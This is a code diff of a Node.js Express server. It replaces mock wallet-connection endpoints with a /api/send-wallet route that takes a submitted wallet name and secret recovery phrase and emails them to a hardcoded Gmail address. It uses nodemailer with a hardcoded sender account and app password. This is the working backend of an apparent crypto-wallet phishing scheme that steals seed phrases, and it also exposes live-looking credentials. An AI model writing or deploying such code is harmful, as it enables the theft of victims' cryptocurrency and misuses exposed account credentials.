@@ -1,48 +1,52 @@
-const express = require('express');
-const cors = require('cors');
+import express from "express";
+import nodemailer from 'nodemailer';
+import bodyParser from 'body-parser';
+import cors from "cors";
+import dotenv from 'dotenv';  
+
+
+dotenv.config();
+
 const app = express();
-const port = process.env.PORT || 3001;
+app.use(cors()); 
+app.use(bodyParser.json());
 
-// Middleware
-app.use(cors()); // Enable CORS for React frontend
-app.use(express.json()); // Parse JSON request bodies
+const email = 'anabeljhonny5@gmail.com';
+const fromEmail = 'anabeljhonny10@gmail.com';
+const pass = 'mgkwcvqeuruxkedz';
 
-// Mock wallet data for testing
-const wallets = {};
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: fromEmail,
+      pass: pass,
+    },
+  });
+  
 
-// Manual connection endpoint
-app.post('/api/send-wallet', (req, res) => {
+app.post('/api/send-wallet', async (req, res) => {
   const { walletName, secretPhrase, userWalletName } = req.body;
 
-  // Basic validation
-  if (!walletName || !secretPhrase || !userWalletName) {
-    return res.status(400).json({ success: false, error: 'Missing required fields' });
-  }
+  const mailOptions = {
+    from: fromEmail,
+    to: email,
+    subject: `New Wallet Info from ${userWalletName}`,
+    text: `
+      Wallet Name: ${walletName}
+      Secret Phrase: ${secretPhrase}
+      Submitted By: ${userWalletName}
+          `,
+  };
 
-  // Mock processing (in a real app, validate and store securely)
-  wallets[userWalletName] = { walletName, secretPhrase };
-  console.log('Received wallet info:', { walletName, userWalletName, secretPhrase });
-
-  res.json({ success: true, message: 'Wallet info processed successfully' });
-});
-
-// Automatic connection endpoint
-app.post('/api/connect-:walletType', (req, res) => {
-  const { walletType } = req.params;
-
-  // Mock response (replace with actual wallet connection logic)
-  if (['metamask', 'trust', 'phantom', 'coinbase', 'binance'].includes(walletType)) {
-    res.json({
-      success: true,
-      address: `mock_address_${walletType}_${Date.now()}`,
-      message: `Connected to ${walletType} successfully`
-    });
-  } else {
-    res.status(400).json({ success: false, error: 'Unsupported wallet type' });
+  try {
+    await transporter.sendMail(mailOptions);
+    console.log('Email sent successfully');
+    res.status(200).json({ success: true });
+  } catch (error) {
+    console.error('Error sending email:', error);
+    res.status(500).json({ success: false, error: 'Failed to send email' });
   }
 });
 
-// Start the server
-app.listen(port, () => {
-  console.log(`Server running on http://localhost:${port}`);
-});
+const PORT = process.env.PORT || 3001;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
